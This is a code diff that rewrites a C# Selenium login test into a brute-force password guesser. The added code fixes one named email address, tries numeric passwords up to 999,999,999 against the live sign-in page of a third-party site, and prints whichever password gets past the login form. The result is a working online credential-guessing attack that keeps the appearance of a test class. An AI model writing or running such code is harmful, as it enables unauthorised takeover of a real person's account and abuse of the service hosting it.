@@ -11,55 +11,39 @@ class SeleniumTest
         var options = new ChromeOptions();
         options.AddArgument("--start-maximized");
 
-        // Initialize the Chrome driver
+        // Initialize ChromeDriver
         using (IWebDriver driver = new ChromeDriver(options))
         {
-            string[] usernames = { "adnan@gmail.com", "student", "adnan@gmail.com" };
-            string[] passwords = { "000000", "sdfgsiu", "99999" };
-            int[] expected = { 1, 0, 1 };
-            int[] actual = { 0, 0, 0 };
+            string username = "adnan@gmail.com"; // Single email
+            int maxPassword = 999999999;  // Max limit (for example, 10^9)
+            int passwordLength = maxPassword.ToString().Length;
 
-            for (int i = 0; i < usernames.Length; i++)
+            for (int i = 1; i <= maxPassword; i++)
             {
-                Console.WriteLine("Test no: " + i);
+                string password = i.ToString().PadLeft(passwordLength, '0'); // Pad with leading zeros (if necessary)
+                Console.WriteLine($"Testing password: {password}");
 
-                driver.Navigate().GoToUrl("https://nogorprobaho.netlify.app");
-                Thread.Sleep(3000); // Wait for page to load
+                // Navigate to the login page
+                driver.Navigate().GoToUrl("https://app.hrbee.xyz/auth/signin");
+                Thread.Sleep(3000); // Wait for the page to load
 
-                // Enter username
-                driver.FindElement(By.CssSelector("#root > div > div > div.flex.flex-col.flex-1 > div > div > div:nth-child(2) > form > div > div:nth-child(1) > div > input"))
-                      .SendKeys(usernames[i]);
+                // Enter username and password
+                driver.FindElement(By.CssSelector("input[type='email'][placeholder='Enter your email']")).SendKeys(username);
+                driver.FindElement(By.CssSelector("input[type='password'][placeholder='Enter your password']")).SendKeys(password);
 
-                // Enter password
-                driver.FindElement(By.CssSelector("#root > div > div > div.flex.flex-col.flex-1 > div > div > div:nth-child(2) > form > div > div:nth-child(2) > div > div > input"))
-                      .SendKeys(passwords[i]);
-
-                // Click Login button
-                driver.FindElement(By.CssSelector("#root > div > div > div.flex.flex-col.flex-1 > div > div > div:nth-child(2) > form > div > div:nth-child(4) > button"))
-                      .Click();
-
-                Thread.Sleep(5000); // Wait for login to complete
+                // Click Sign In
+                driver.FindElement(By.CssSelector("input[type='submit'][value='Sign In']")).Click();
+                Thread.Sleep(5000); // Wait for login attempt to process
 
                 // Check if login was successful
-                if (driver.Title == "Logged In Successfully | Practice Test Automation")
+                if (driver.Url.Contains("dashboard") || !driver.Url.Contains("signin"))
                 {
-                    actual[i] = 1;
+                    Console.WriteLine($"Login successful with password: {password}");
+                    break; // Exit the loop if successful
                 }
 
-                if (expected[i] == actual[i])
-                {
-                    Console.WriteLine($"Test {i} is Successful");
-                }
-                else
-                {
-                    Console.WriteLine($"Test {i} is Unsuccessful");
-                }
-
-                // Clear cookies to reset session for next test
-                driver.Manage().Cookies.DeleteAllCookies();
+                // Optionally, add more checks for error message or failed login
             }
         }
     }
 }
-
-
